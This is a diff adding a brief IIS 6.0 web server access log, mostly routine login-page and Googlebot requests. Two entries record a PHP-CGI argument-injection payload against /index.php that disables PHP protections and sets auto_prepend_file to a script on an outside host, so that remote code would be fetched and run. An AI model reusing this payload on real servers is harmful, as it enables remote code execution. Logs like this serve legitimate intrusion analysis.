@@ -1,0 +1,22 @@
+#Software: Microsoft Internet Information Services 6.0
+#Version: 1.0
+#Date: 2013-09-24 11:03:47
+#Fields: date time s-sitename s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) sc-status sc-substatus sc-win32-status 
+2013-09-24 11:03:47 W3SVC60 208.123.218.206 GET /login.php - 80 - 69.64.58.188 Mozilla/5.0+(Windows;+U;+Windows+NT+5.1;+en-US;+rv:1.8.1.1)+Gecko/20061204+Firefox/2.0.0.1 200 0 0
+#Software: Microsoft Internet Information Services 6.0
+#Version: 1.0
+#Date: 2013-09-24 12:47:58
+#Fields: date time s-sitename s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) sc-status sc-substatus sc-win32-status 
+2013-09-24 12:47:58 W3SVC60 208.123.218.206 GET /index.php -dsafe_mode%3dOff+-ddisable_functions%3dNULL+-dallow_url_fopen%3dOn+-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3A%2F%2F61.19.253.26%2Fecho.txt 80 - 66.31.181.92 Mozilla/5.0+(Windows+NT+6.1;+WOW64;+rv:23.0)+Gecko/20100101+Firefox/23.0 404 0 0
+2013-09-24 12:47:58 W3SVC60 208.123.218.206 GET /index.php -dsafe_mode%3dOff+-ddisable_functions%3dNULL+-dallow_url_fopen%3dOn+-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3A%2F%2F61.19.253.26%2Fecho.txt 80 - 94.216.64.154 Mozilla/5.0+(Windows+NT+6.1;+WOW64;+rv:23.0)+Gecko/20100101+Firefox/23.0 404 0 0
+#Software: Microsoft Internet Information Services 6.0
+#Version: 1.0
+#Date: 2013-09-24 16:14:58
+#Fields: date time s-sitename s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) sc-status sc-substatus sc-win32-status 
+2013-09-24 16:14:58 W3SVC60 208.123.218.206 GET /robots.txt - 80 - 66.249.73.114 Mozilla/5.0+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html) 404 0 2
+2013-09-24 16:14:58 W3SVC60 208.123.218.206 GET /login.php - 80 - 66.249.73.114 Mozilla/5.0+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html) 200 0 0
+#Software: Microsoft Internet Information Services 6.0
+#Version: 1.0
+#Date: 2013-09-24 23:50:47
+#Fields: date time s-sitename s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) sc-status sc-substatus sc-win32-status 
+2013-09-24 23:50:47 W3SVC60 208.123.218.206 GET /login.php - 80 - 66.249.73.114 Mozilla/5.0+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html) 200 0 0
